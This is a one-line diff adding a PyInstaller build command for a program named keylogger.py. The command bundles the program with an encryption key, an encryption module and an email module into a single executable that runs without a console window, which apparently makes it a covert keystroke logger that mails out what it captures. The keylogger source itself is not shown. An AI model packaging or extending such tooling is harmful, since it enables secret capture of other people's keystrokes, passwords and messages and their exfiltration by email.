@@ -1,0 +1,1 @@
+pyinstaller --onefile --noconsole --add-data "encryption_key.bin;." --add-data "encryption.py;." --add-data "emailFunctionality.py;." keylogger.py
